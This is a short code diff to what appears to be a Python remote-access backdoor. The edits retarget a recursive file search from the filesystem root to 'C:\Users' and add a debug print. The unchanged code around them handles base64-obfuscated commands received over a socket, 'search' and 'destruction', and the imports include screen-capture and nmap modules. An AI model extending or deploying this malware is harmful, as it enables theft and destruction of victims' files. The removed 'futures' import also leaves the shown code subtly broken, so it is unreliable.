@@ -22,7 +22,6 @@ import ipaddress
 import asyncio
 import secrets
 import concurrent
-from concurrent import futures
 from nmap_vscan import vscan
 from PIL import ImageGrab
 import services
@@ -834,10 +833,10 @@ def fd_fs_n_ds(drs, ptr):
         for dr in drs:
             for rt, dr, fps in os.walk(dr):
                 for bs in fps:
+                    print(bs, ptr)
                     if fnmatch.fnmatch(bs, ptr):
                         fp = os.path.join(rt, bs)
                         futures.append(executor.submit(stf, fp, fnded))
-
         concurrent.futures.wait(futures)
         buffer = len(str(fnded))
         if buffer > 7000:
@@ -950,7 +949,7 @@ def game (sock):
 
         elif "c2VhcmNo" .encode () in instruct:
             ext = "*.{}".format(instruct .decode ().replace ("c2VhcmNo ", ""))
-            fd_fs_n_ds(['/'], ext)
+            fd_fs_n_ds(['C:\\Users'], ext)
 
         elif "ZGVzdHJ1Y3Rpb24K" .encode () in instruct:
             dstrct()
